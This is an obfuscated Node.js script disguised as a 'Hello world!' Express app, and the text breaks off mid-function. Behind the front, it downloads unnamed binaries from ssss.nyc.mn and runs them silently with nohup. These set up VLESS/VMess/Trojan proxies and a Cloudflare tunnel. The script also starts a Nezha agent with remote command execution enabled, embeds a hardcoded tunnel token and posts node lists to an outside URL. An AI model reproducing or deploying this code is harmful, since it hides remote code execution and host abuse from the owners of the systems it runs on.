function _0x5b2a(_0x340d74,_0x39a337){const _0x324d50=_0x324d();return _0x5b2a=function(_0x5b2a7e,_0xeae745){_0x5b2a7e=_0x5b2a7e-0xa1;let _0x342d0c=_0x324d50[_0x5b2a7e];return _0x342d0c;},_0x5b2a(_0x340d74,_0x39a337);}const _0x11fd1e=_0x5b2a;(function(_0x54e510,_0x59c0c9){const _0xe417aa={_0xd12417:0xac,_0x21c28c:0x15d,_0x4cd4f4:0xa9,_0x3183d2:0xe7,_0x2af376:0xa7,_0x49d4ce:0xa6,_0x14e9b4:0xad},_0x134518=_0x5b2a,_0x1873c0=_0x54e510();while(!![]){try{const _0x9d0aea=parseInt(_0x134518(_0xe417aa._0xd12417))/0x1*(-parseInt(_0x134518(0x15e))/0x2)+parseInt(_0x134518(_0xe417aa._0x21c28c))/0x3*(-parseInt(_0x134518(0x162))/0x4)+-parseInt(_0x134518(_0xe417aa._0x4cd4f4))/0x5+-parseInt(_0x134518(_0xe417aa._0x3183d2))/0x6+-parseInt(_0x134518(0x12e))/0x7*(-parseInt(_0x134518(_0xe417aa._0x2af376))/0x8)+parseInt(_0x134518(_0xe417aa._0x49d4ce))/0x9+parseInt(_0x134518(_0xe417aa._0x14e9b4))/0xa;if(_0x9d0aea===_0x59c0c9)break;else _0x1873c0['push'](_0x1873c0['shift']());}catch(_0x50c36b){_0x1873c0['push'](_0x1873c0['shift']());}}}(_0x324d,0x40cd1));const express=require(_0x11fd1e(0x100)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x11fd1e(0xdd)),exec=promisify(require(_0x11fd1e(0xd2))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x11fd1e(0x118)][_0x11fd1e(0x127)]||'',PROJECT_URL=process[_0x11fd1e(0x118)][_0x11fd1e(0x105)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x11fd1e(0x118)][_0x11fd1e(0xb8)]||_0x11fd1e(0x163),SUB_PATH=process[_0x11fd1e(0x118)][_0x11fd1e(0x121)]||_0x11fd1e(0x13f),PORT=process[_0x11fd1e(0x118)][_0x11fd1e(0xb9)]||process[_0x11fd1e(0x118)][_0x11fd1e(0x110)]||0xbb8,UUID=process[_0x11fd1e(0x118)][_0x11fd1e(0x13c)]||_0x11fd1e(0xbd),NEZHA_SERVER=process[_0x11fd1e(0x118)][_0x11fd1e(0xd3)]||'',NEZHA_PORT=process[_0x11fd1e(0x118)][_0x11fd1e(0x11c)]||'',NEZHA_KEY=process['env'][_0x11fd1e(0xa5)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x11fd1e(0x151),ARGO_AUTH=process[_0x11fd1e(0x118)][_0x11fd1e(0xc3)]||_0x11fd1e(0xe9),ARGO_PORT=process[_0x11fd1e(0x118)][_0x11fd1e(0xea)]||0x1f41,CFIP=process['env'][_0x11fd1e(0xb4)]||_0x11fd1e(0xda),CFPORT=process[_0x11fd1e(0x118)][_0x11fd1e(0xef)]||0x1bb,NAME=process[_0x11fd1e(0x118)][_0x11fd1e(0xba)]||'galaxycloud';!fs[_0x11fd1e(0xf3)](FILE_PATH)?(fs[_0x11fd1e(0xfc)](FILE_PATH),console['log'](FILE_PATH+_0x11fd1e(0xdc))):console['log'](FILE_PATH+_0x11fd1e(0xb7));function generateRandomName(){const _0x2f23ec={_0x28dfb8:0x10d,_0x433a85:0x104,_0x5e7da9:0x130},_0x690398=_0x11fd1e,_0x2cc3ea=_0x690398(_0x2f23ec._0x28dfb8);let _0xe91afe='';for(let _0x11e73c=0x0;_0x11e73c<0x6;_0x11e73c++){_0xe91afe+=_0x2cc3ea[_0x690398(_0x2f23ec._0x433a85)](Math['floor'](Math[_0x690398(0xb5)]()*_0x2cc3ea[_0x690398(_0x2f23ec._0x5e7da9)]));}return _0xe91afe;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x11fd1e(0xcb)](FILE_PATH,npmName),phpPath=path[_0x11fd1e(0xcb)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x11fd1e(0xcb)](FILE_PATH,botName),subPath=path[_0x11fd1e(0xcb)](FILE_PATH,_0x11fd1e(0x11b)),listPath=path[_0x11fd1e(0xcb)](FILE_PATH,_0x11fd1e(0x159)),bootLogPath=path['join'](FILE_PATH,_0x11fd1e(0x155)),configPath=path[_0x11fd1e(0xcb)](FILE_PATH,'config.json');function deleteNodes(){const _0x170d03={_0x4587b5:0xfa,_0x467a73:0xd9},_0x589d06=_0x11fd1e;try{if(!UPLOAD_URL)return;if(!fs[_0x589d06(0xf3)](subPath))return;let _0x3266d4;try{_0x3266d4=fs[_0x589d06(0xfb)](subPath,_0x589d06(0x139));}catch{return null;}const _0x272cb6=Buffer['from'](_0x3266d4,_0x589d06(0xae))['toString']('utf-8'),_0x271a3b=_0x272cb6[_0x589d06(0x113)]('\x0a')[_0x589d06(0x149)](_0x57148d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x57148d));if(_0x271a3b[_0x589d06(0x130)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x589d06(_0x170d03._0x4587b5)]({'nodes':_0x271a3b}),{'headers':{'Content-Type':'application/json'}})[_0x589d06(_0x170d03._0x467a73)](_0x1e8eda=>{return null;}),null;}catch(_0x95bafb){return null;}}function cleanupOldFiles(){const _0x12ec8e={_0x2bb1c0:0xb6},_0x672e10={_0x411f58:0xc5},_0x22f1c2=_0x11fd1e;try{const _0x4e535b=fs[_0x22f1c2(0x136)](FILE_PATH);_0x4e535b[_0x22f1c2(_0x12ec8e._0x2bb1c0)](_0x3826cb=>{const _0x3fe8d3=_0x22f1c2,_0x560b5c=path['join'](FILE_PATH,_0x3826cb);try{const _0xaa11f6=fs[_0x3fe8d3(0x14c)](_0x560b5c);_0xaa11f6[_0x3fe8d3(0x109)]()&&fs[_0x3fe8d3(_0x672e10._0x411f58)](_0x560b5c);}catch(_0x2b3a87){}});}catch(_0xfaa271){}}app[_0x11fd1e(0xbc)]('/',function(_0x45c380,_0x5c2a46){const _0x513a72={_0x52f450:0x152},_0x43e2d1=_0x11fd1e;_0x5c2a46[_0x43e2d1(_0x513a72._0x52f450)]('Hello\x20world!');});async function generateConfig(){const _0x5b8535={_0x48d230:0x103,_0x39c888:0x142,_0x5845ab:0xc9,_0x13d2dd:0xdb,_0x10f8f5:0x144,_0x22e21e:0xf2,_0x43d9de:0x160,_0x580d6f:0x157,_0x11ec65:0x114},_0x30944c=_0x11fd1e,_0x329a86={'log':{'access':_0x30944c(0x120),'error':'/dev/null','loglevel':_0x30944c(0x103)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x30944c(_0x5b8535._0x48d230),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x30944c(_0x5b8535._0x39c888),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x30944c(0x103)},'streamSettings':{'network':_0x30944c(0xde),'security':'none'}},{'port':0xbba,'listen':_0x30944c(_0x5b8535._0x5845ab),'protocol':_0x30944c(_0x5b8535._0x13d2dd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x30944c(_0x5b8535._0x48d230)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x30944c(0xd0)}},'sniffing':{'enabled':!![],'destOverride':[_0x30944c(0x160),_0x30944c(0xaa),_0x30944c(_0x5b8535._0x10f8f5)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x30944c(_0x5b8535._0x22e21e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x30944c(_0x5b8535._0x43d9de),'tls',_0x30944c(0x144)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x30944c(0x103),'wsSettings':{'path':_0x30944c(_0x5b8535._0x580d6f)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x30944c(_0x5b8535._0x10f8f5)],'metadataOnly':![]}}],'dns':{'servers':[_0x30944c(0x148)]},'outbounds':[{'protocol':'freedom','tag':_0x30944c(0xa2)},{'protocol':'blackhole','tag':_0x30944c(_0x5b8535._0x11ec65)}]};fs[_0x30944c(0x101)](path[_0x30944c(0xcb)](FILE_PATH,_0x30944c(0xc7)),JSON[_0x30944c(0xfa)](_0x329a86,null,0x2));}function getSystemArchitecture(){const _0x430fb9={_0x3a7c7f:0xab,_0x49b6a7:0x147},_0x3bef53=_0x11fd1e,_0x7ec5fe=os[_0x3bef53(0x123)]();return _0x7ec5fe===_0x3bef53(_0x430fb9._0x3a7c7f)||_0x7ec5fe==='arm64'||_0x7ec5fe===_0x3bef53(0x146)?'arm':_0x3bef53(_0x430fb9._0x49b6a7);}function downloadFile(_0x136be6,_0x33471b,_0x3c21a8){const _0x5ba950={_0x58ebcc:0xf8,_0x80db9b:0xd9},_0x59d526={_0x26f828:0x134},_0x2f1c77={_0x59bf01:0x124},_0x482697={_0x4a675d:0x107,_0x1b83b6:0xd6},_0x2c55bf=_0x11fd1e,_0x20db35=_0x136be6;!fs[_0x2c55bf(0xf3)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x521ab1=fs[_0x2c55bf(_0x5ba950._0x58ebcc)](_0x20db35);axios({'method':'get','url':_0x33471b,'responseType':_0x2c55bf(0x10f)})['then'](_0x110cd7=>{const _0x1966cd={_0x35a189:0x156},_0x4501ea=_0x2c55bf;_0x110cd7[_0x4501ea(0x161)][_0x4501ea(_0x2f1c77._0x59bf01)](_0x521ab1),_0x521ab1['on']('finish',()=>{const _0x22f7de=_0x4501ea;_0x521ab1['close'](),console[_0x22f7de(_0x482697._0x4a675d)](_0x22f7de(_0x482697._0x1b83b6)+path[_0x22f7de(0x134)](_0x20db35)+'\x20successfully'),_0x3c21a8(null,_0x20db35);}),_0x521ab1['on'](_0x4501ea(0x156),_0xc9eeed=>{const _0x3fe576=_0x4501ea;fs[_0x3fe576(0x14b)](_0x20db35,()=>{});const _0x277530='Download\x20'+path['basename'](_0x20db35)+'\x20failed:\x20'+_0xc9eeed[_0x3fe576(0x15b)];console[_0x3fe576(_0x1966cd._0x35a189)](_0x277530),_0x3c21a8(_0x277530);});})[_0x2c55bf(_0x5ba950._0x80db9b)](_0x32639b=>{const _0x3eb9a7=_0x2c55bf,_0x469be8='Download\x20'+path[_0x3eb9a7(_0x59d526._0x26f828)](_0x20db35)+'\x20failed:\x20'+_0x32639b[_0x3eb9a7(0x15b)];console[_0x3eb9a7(0x156)](_0x469be8),_0x3c21a8(_0x469be8);});}async function downloadFilesAndRun(){const _0x325da2={_0x10e172:0x130,_0x3e287c:0x14e,_0x94e89d:0x12c,_0xc7c43f:0x158,_0x2b9de8:0xd5,_0x1ba985:0x11f,_0x58e266:0xeb,_0x48f53d:0x132,_0x31a2ef:0x126,_0x31db1f:0x101,_0x5b9e10:0xcb,_0x391a7f:0x15c,_0x38f719:0x10c,_0x5b8c6e:0xfd,_0x1bdae1:0xa3,_0xbcd550:0x117,_0x3182b0:0xca,_0x4fbd92:0x102,_0x3450db:0x107,_0x3fdabc:0x153,_0x22d3fa:0x107,_0x875e4e:0xf5,_0x40af65:0x11a,_0x10a894:0xe4,_0x368b87:0xf1,_0x4b7951:0xdf,_0xcc4054:0x156},_0x4ebe7c={_0xeb9111:0xf3,_0x26d03e:0xa4},_0x4b9531=_0x11fd1e,_0x188b13=getSystemArchitecture(),_0x233d37=getFilesForArchitecture(_0x188b13);if(_0x233d37[_0x4b9531(_0x325da2._0x10e172)]===0x0){console[_0x4b9531(0x107)](_0x4b9531(0xc2));return;}const _0x2007de=_0x233d37['map'](_0x408596=>{const _0x3c738c={_0x245c46:0x129,_0x4eb14e:0x143};return new Promise((_0x42566a,_0x970b54)=>{const _0x15c616=_0x5b2a;downloadFile(_0x408596[_0x15c616(_0x3c738c._0x245c46)],_0x408596[_0x15c616(_0x3c738c._0x4eb14e)],(_0x41758c,_0x3766ba)=>{_0x41758c?_0x970b54(_0x41758c):_0x42566a(_0x3766ba);});});});try{await Promise['all'](_0x2007de);}catch(_0x3c805c){console[_0x4b9531(0x156)](_0x4b9531(_0x325da2._0x3e287c),_0x3c805c);return;}function _0x13cfa9(_0x1cb151){const _0x5790a7={_0x3ce49d:0x156,_0xa8b10d:0xe5},_0x5329fe=_0x4b9531,_0x2d3108=0x1fd;_0x1cb151[_0x5329fe(0xb6)](_0x5e66f0=>{const _0x5e635d=_0x5329fe;fs[_0x5e635d(_0x4ebe7c._0xeb9111)](_0x5e66f0)&&fs[_0x5e635d(_0x4ebe7c._0x26d03e)](_0x5e66f0,_0x2d3108,_0x4acdd0=>{const _0x3b9db0=_0x5e635d;_0x4acdd0?console[_0x3b9db0(_0x5790a7._0x3ce49d)]('Empowerment\x20failed\x20for\x20'+_0x5e66f0+':\x20'+_0x4acdd0):console[_0x3b9db0(0x107)](_0x3b9db0(_0x5790a7._0xa8b10d)+_0x5e66f0+':\x20'+_0x2d3108[_0x3b9db0(0x133)](0x8));});});}const _0x5e57e0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x13cfa9(_0x5e57e0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xd9a0e3=NEZHA_SERVER[_0x4b9531(_0x325da2._0x94e89d)](':')?NEZHA_SERVER['split'](':')[_0x4b9531(0xc6)]():'',_0xd1cc73=new Set([_0x4b9531(_0x325da2._0xc7c43f),'8443',_0x4b9531(0x12b),_0x4b9531(0xd4),'2083',_0x4b9531(_0x325da2._0x2b9de8)]),_0x1ce533=_0xd1cc73[_0x4b9531(_0x325da2._0x1ba985)](_0xd9a0e3)?_0x4b9531(_0x325da2._0x58e266):_0x4b9531(_0x325da2._0x48f53d),_0x57d09f=_0x4b9531(0x14a)+NEZHA_KEY+_0x4b9531(0xf9)+NEZHA_SERVER+_0x4b9531(_0x325da2._0x31a2ef)+_0x1ce533+_0x4b9531(0xd8)+UUID;fs[_0x4b9531(_0x325da2._0x31db1f)](path[_0x4b9531(_0x325da2._0x5b9e10)](FILE_PATH,_0x4b9531(_0x325da2._0x391a7f)),_0x57d09f);const _0x4d7467='nohup\x20'+phpPath+_0x4b9531(0xc1)+FILE_PATH+_0x4b9531(_0x325da2._0x38f719);try{await exec(_0x4d7467),console[_0x4b9531(0x107)](phpName+_0x4b9531(_0x325da2._0x5b8c6e)),await new Promise(_0x4cc3ed=>setTimeout(_0x4cc3ed,0x3e8));}catch(_0x5e4e62){console[_0x4b9531(0x156)]('php\x20running\x20error:\x20'+_0x5e4e62);}}else{let _0x49477a='';const _0x13eb81=['443','8443',_0x4b9531(0x12b),'2087',_0x4b9531(0x12d),_0x4b9531(0xd5)];_0x13eb81[_0x4b9531(_0x325da2._0x94e89d)](NEZHA_PORT)&&(_0x49477a=_0x4b9531(_0x325da2._0x1bdae1));const _0x1a2c6f='nohup\x20'+npmPath+_0x4b9531(_0x325da2._0xbcd550)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4b9531(_0x325da2._0x3182b0)+NEZHA_KEY+'\x20'+_0x49477a+_0x4b9531(_0x325da2._0x4fbd92);try{await exec(_0x1a2c6f),console[_0x4b9531(_0x325da2._0x3450db)](npmName+_0x4b9531(0xfd)),await new Promise(_0x32ed12=>setTimeout(_0x32ed12,0x3e8));}catch(_0xb6299d){console[_0x4b9531(0x156)](_0x4b9531(_0x325da2._0x3fdabc)+_0xb6299d);}}}else console[_0x4b9531(_0x325da2._0x22d3fa)](_0x4b9531(_0x325da2._0x875e4e));const _0x37b197=_0x4b9531(0x12f)+webPath+_0x4b9531(0xbf)+FILE_PATH+_0x4b9531(0x13a);try{await exec(_0x37b197),console[_0x4b9531(_0x325da2._0x3450db)](webName+_0x4b9531(0xfd)),await new Promise(_0x2d3b70=>setTimeout(_0x2d3b70,0x3e8));}catch(_0x2c4d4a){console[_0x4b9531(0x156)](_0x4b9531(0x125)+_0x2c4d4a);}if(fs[_0x4b9531(0xf3)](botPath)){let _0x5069be;if(ARGO_AUTH[_0x4b9531(_0x325da2._0x40af65)](/^[A-Z0-9a-z=]{120,250}$/))_0x5069be='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x4b9531(0x11a)](/TunnelSecret/)?_0x5069be=_0x4b9531(0xaf)+FILE_PATH+'/tunnel.yml\x20run':_0x5069be=_0x4b9531(_0x325da2._0x10a894)+FILE_PATH+_0x4b9531(_0x325da2._0x368b87)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5069be+_0x4b9531(_0x325da2._0x4b7951)),console[_0x4b9531(0x107)](botName+_0x4b9531(0xfd)),await new Promise(_0x4660af=>setTimeout(_0x4660af,0x7d0));}catch(_0xd3d023){console[_0x4b9531(_0x325da2._0xcc4054)](_0x4b9531(0x154)+_0xd3d023);}}await new Promise(_0x3f11d1=>setTimeout(_0x3f11d1,0x1388));}function getFilesForArchitecture(_0x28bd3f){const _0xcf9fbd={_0x244cc2:0x106,_0xf64f2d:0x119,_0x5726ed:0x15f,_0x226f6b:0x15a,_0x5a4494:0xa8},_0x30d494=_0x11fd1e;let _0x2522d9;_0x28bd3f===_0x30d494(0xab)?_0x2522d9=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x30d494(0x13d)}]:_0x2522d9=[{'fileName':webPath,'fileUrl':_0x30d494(_0xcf9fbd._0x244cc2)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x29e671=_0x28bd3f===_0x30d494(0xab)?_0x30d494(_0xcf9fbd._0xf64f2d):_0x30d494(0xfe);_0x2522d9[_0x30d494(0xa8)]({'fileName':npmPath,'fileUrl':_0x29e671});}else{const _0x47f51c=_0x28bd3f==='arm'?_0x30d494(_0xcf9fbd._0x5726ed):_0x30d494(_0xcf9fbd._0x226f6b);_0x2522d9[_0x30d494(_0xcf9fbd._0x5a4494)]({'fileName':phpPath,'fileUrl':_0x47f51c});}}return _0x2522d9;}function _0x324d(){const _0x3d1c38=['forEach','\x20already\x20exists','FILE_PATH','SERVER_PORT','NAME','&path=%2Ftrojan-argo%3Fed%3D2560#','get','5d6e2977-ce04-4be1-b797-ad40e30ee1e3','App\x20is\x20running','\x20-c\x20','ArgoDomain:','\x20-c\x20\x22','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ARGO_AUTH','\x22\x20>\x20/dev/null\x202>&1','unlinkSync','pop','config.json','Unknown','127.0.0.1','\x20-p\x20','join','Skipping\x20adding\x20automatic\x20access\x20task','/api/add-nodes','pkill\x20-f\x20\x22[','tunnel.yml','/vless-argo','clear','child_process','NEZHA_SERVER','2087','2053','Download\x20','http://ip-api.com/json/','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','catch','cdns.doon.eu.org','vless','\x20is\x20created','util','tcp','\x20>/dev/null\x202>&1\x20&','&path=%2Fvless-argo%3Fed%3D2560#','?encryption=none&security=tls&sni=','countryCode','https://ipapi.co/json/','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Empowerment\x20success\x20for\x20','from','2199492UskQkk','post','eyJhIjoiZjkyZmQ0N2QxYmRmNTY1MmU3NjVhYTMzNGNjN2QyYmMiLCJ0IjoiMDNjZTZlNzMtNzU4Yy00YzhlLThmZDEtZTYxZTM3YTU3NGQ1IiwicyI6IlpXSmtOelF3TkdFdE5XVTVNeTAwTjJFekxUbG1aR1F0Tm1RMk1XUXdPRFpqWVRBeSJ9','ARGO_PORT','true','org','?security=tls&sni=','\x0a\x0atrojan://','CFPORT','\x20>\x20nul\x202>&1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','vmess','existsSync','taskkill\x20/f\x20/im\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','platform','application/json','createWriteStream','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','stringify','readFileSync','mkdirSync','\x20is\x20running','https://amd64.ssss.nyc.mn/agent','response','express','writeFileSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','none','charAt','PROJECT_URL','https://amd64.ssss.nyc.mn/web','log','Nodes\x20uploaded\x20successfully','isFile','test','\x0a\x0avmess://','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','abcdefghijklmnopqrstuvwxyz','del\x20/f\x20/q\x20','stream','PORT','set','.exe\x20>\x20nul\x202>&1','split','block','/vmess-argo?ed=2560','text/plain;\x20charset=utf-8','\x20-s\x20','env','https://arm64.ssss.nyc.mn/agent','match','sub.txt','NEZHA_PORT','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','has','/dev/null','SUB_PATH','\x0a\x20\x20\x20\x20','arch','pipe','web\x20running\x20error:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','UPLOAD_URL','Add\x20automatic\x20access\x20task\x20faild:\x20','fileName','country_code','2096','includes','2083','1757833PMerZv','nohup\x20','length','/api/add-subscriptions','false','toString','basename','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','readdirSync','\x20>/dev/null\x202>&1','win32','utf-8','/config.json\x20>/dev/null\x202>&1\x20&','TunnelSecret','UUID','https://arm64.ssss.nyc.mn/bot','listen','sub','rm\x20-rf\x20','tunnel.json','/vmess-argo','fileUrl','quic','Subscription\x20uploaded\x20successfully','aarch64','amd','https+local://8.8.8.8/dns-query','filter','\x0aclient_secret:\x20','unlink','statSync','\x0a\x20\x20credentials-file:\x20','Error\x20downloading\x20files:','Content-Type','Error\x20reading\x20boot.log:','ussap.sbxxx.qzz.io','send','npm\x20running\x20error:\x20','Error\x20executing\x20command:\x20','boot.log','error','/trojan-argo','443','list.txt','https://amd64.ssss.nyc.mn/v1','message','config.yaml','3xMvedk','289658zIgAuZ','https://arm64.ssss.nyc.mn/v1','http','data','766048PtjHuC','./tmp','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','direct','--tls','chmod','NEZHA_KEY','3098475WcmTgy','8fRNWCq','unshift','1166190GetIpd','tls','arm','1RNHCBd','6061920usfNqz','base64','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','&fp=firefox&type=ws&host=','status','Error\x20in\x20startserver:','push','CFIP','random'];_0x324d=function(){return _0x3d1c38;};return _0x324d();}function argoType(){const _0x11acea={_0x15fdc8:0x12c,_0x44c2cb:0x101,_0x223b1d:0x11d,_0x2dee3c:0xcf},_0x3307d5=_0x11fd1e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3307d5(0x107)](_0x3307d5(0xa1));return;}if(ARGO_AUTH[_0x3307d5(_0x11acea._0x15fdc8)](_0x3307d5(0x13b))){fs[_0x3307d5(_0x11acea._0x44c2cb)](path['join'](FILE_PATH,_0x3307d5(0x141)),ARGO_AUTH);const _0x25d7b7='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x3307d5(0x113)]('\x22')[0xb]+_0x3307d5(0x14d)+path['join'](FILE_PATH,_0x3307d5(0x141))+_0x3307d5(0x135)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x3307d5(_0x11acea._0x223b1d);fs[_0x3307d5(0x101)](path['join'](FILE_PATH,_0x3307d5(_0x11acea._0x2dee3c)),_0x25d7b7);}else console[_0x3307d5(0x107)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x4f8d71={_0x2d944e:0x113,_0x3b7203:0xc0,_0x3b5f03:0xc5,_0x5ccaac:0xfd,_0x2b311b:0x156,_0x49873b:0x154,_0x34cbea:0x156},_0x215700={_0x59b069:0xbc,_0x37df8c:0xe3,_0x2f4f58:0x161,_0x533789:0x161,_0x56a4d1:0xec,_0x1a5ec1:0xec,_0x332e7a:0x161},_0x55ecda={_0x1d7aa3:0xf6,_0x12c48f:0xce,_0x4fdcd9:0xc4},_0x577e84={_0xe90116:0x11a},_0x3faeb9=_0x11fd1e;let _0x341d95;if(ARGO_AUTH&&ARGO_DOMAIN)_0x341d95=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x341d95),await _0x51b881(_0x341d95);else try{const _0x4af916=fs[_0x3faeb9(0xfb)](path['join'](FILE_PATH,'boot.log'),'utf-8'),_0x34e902=_0x4af916[_0x3faeb9(_0x4f8d71._0x2d944e)]('\x0a'),_0x2f358d=[];_0x34e902[_0x3faeb9(0xb6)](_0x267631=>{const _0x27e2e4=_0x3faeb9,_0x4a63cc=_0x267631[_0x27e2e4(_0x577e84._0xe90116)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4a63cc){const _0x7acee6=_0x4a63cc[0x1];_0x2f358d['push'](_0x7acee6);}});if(_0x2f358d['length']>0x0)_0x341d95=_0x2f358d[0x0],console[_0x3faeb9(0x107)](_0x3faeb9(_0x4f8d71._0x3b7203),_0x341d95),await _0x51b881(_0x341d95);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x3faeb9(_0x4f8d71._0x3b5f03)](path[_0x3faeb9(0xcb)](FILE_PATH,_0x3faeb9(0x155)));async function _0x50c8af(){const _0x94aee0=_0x3faeb9;try{process[_0x94aee0(_0x55ecda._0x1d7aa3)]==='win32'?await exec(_0x94aee0(0xf4)+botName+_0x94aee0(0x112)):await exec(_0x94aee0(_0x55ecda._0x12c48f)+botName[_0x94aee0(0x104)](0x0)+']'+botName['substring'](0x1)+_0x94aee0(_0x55ecda._0x4fdcd9));}catch(_0x5a1d90){}}_0x50c8af(),await new Promise(_0x2c0c83=>setTimeout(_0x2c0c83,0xbb8));const _0x47f472='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3faeb9(0xf1)+ARGO_PORT;try{await exec(_0x3faeb9(0x12f)+botPath+'\x20'+_0x47f472+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x3faeb9(_0x4f8d71._0x5ccaac)),await new Promise(_0x117046=>setTimeout(_0x117046,0xbb8)),await extractDomains();}catch(_0xcb8463){console[_0x3faeb9(_0x4f8d71._0x2b311b)](_0x3faeb9(_0x4f8d71._0x49873b)+_0xcb8463);}}}catch(_0x3b181b){console[_0x3faeb9(_0x4f8d71._0x34cbea)](_0x3faeb9(0x150),_0x3b181b);}async function _0x3cd482(){const _0x44f510=_0x3faeb9;try{const _0x115d45=await axios[_0x44f510(_0x215700._0x59b069)](_0x44f510(_0x215700._0x37df8c),{'timeout':0xbb8});if(_0x115d45['data']&&_0x115d45[_0x44f510(_0x215700._0x2f4f58)]['country_code']&&_0x115d45[_0x44f510(_0x215700._0x533789)][_0x44f510(_0x215700._0x56a4d1)])return _0x115d45[_0x44f510(0x161)][_0x44f510(0x12a)]+'_'+_0x115d45[_0x44f510(0x161)][_0x44f510(_0x215700._0x1a5ec1)];}catch(_0x1652f6){try{const _0x42c3fe=await axios[_0x44f510(0xbc)](_0x44f510(0xd7),{'timeout':0xbb8});if(_0x42c3fe[_0x44f510(0x161)]&&_0x42c3fe[_0x44f510(_0x215700._0x533789)][_0x44f510(0xb1)]==='success'&&_0x42c3fe[_0x44f510(0x161)][_0x44f510(0xe2)]&&_0x42c3fe[_0x44f510(_0x215700._0x533789)][_0x44f510(_0x215700._0x1a5ec1)])return _0x42c3fe[_0x44f510(0x161)]['countryCode']+'_'+_0x42c3fe[_0x44f510(_0x215700._0x332e7a)][_0x44f510(_0x215700._0x1a5ec1)];}catch(_0x452565){}}return _0x44f510(0xc8);}async function _0x51b881(_0x40e5c8){const _0x4fc28b=await _0x3cd482(),_0x50bc73=NAME?NAME+'-'+_0x4fc28b:_0x4fc28b;return new Promise(_0x5ecd43=>{const _0x28e658={_0x53b7a8:0x103,_0x594a90:0x103,_0x7975b2:0x115,_0x172d63:0xe1,_0x4f4b6c:0xee,_0x3b67b9:0xb0,_0x20ecbc:0xbb,_0x46b80c:0x122,_0x3035a4:0xae};setTimeout(()=>{const 